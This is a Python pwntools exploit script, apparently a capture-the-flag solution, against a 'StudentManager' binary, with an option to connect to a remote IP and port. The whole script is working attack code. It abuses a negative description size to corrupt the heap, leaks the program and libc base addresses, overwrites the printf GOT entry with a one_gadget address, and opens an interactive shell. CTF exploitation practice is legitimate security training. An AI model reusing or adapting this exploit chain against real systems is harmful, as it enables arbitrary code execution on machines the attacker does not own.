from pwn import *

#context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./StudentManager')
libc = ELF('./libc-2.31.so')

debug = 1

if debug:
    io = process('./StudentManager')
else:
    io = remote('39.102.55.191',9998)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget= [0xe3b2e,0xe3b31,0xe3b34]

def add(descrip_size):
    io.sendlineafter(b">> ",str(1))
    io.sendlineafter(b"Input Student Name: ",b'a'* 0xf)
    io.sendlineafter(b"Input Student Description Size: ",str(descrip_size))
    io.sendlineafter(b"Input Student Description: ",b'')

def edit(idx,name,descrip):
    io.sendlineafter(b">> ",str(2))
    io.sendlineafter(b"Input the index of Student want to edit: ",str(idx))
    io.sendafter(b"Input New Name: ",name)
    io.sendafter(b"Input new description: ",descrip)

def show(idx):
    io.sendlineafter(b">> ",str(3))
    io.sendlineafter(b"Input the index of Student want to show: ",str(idx))

add(8)
for i in range(10):
    add(-8)
for i in range(9):
    add(8)
edit(0,b'a'*0x10,b'\n')
show(0)
io.recvuntil(b'a'*0x10)
code_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x4320
success("code_base -->" + hex(code_base))
puts_got = code_base + elf.got['puts']
printf_got = code_base + elf.got['printf']
edit(18,b'\n',p64(printf_got))
show(19)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.symbols['printf']
#libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) 
success("libc_base -->" + hex(libc_base))

#p()
edit(19,b'\n',p64(one_gadget[1] + libc_base))

io.interactive()


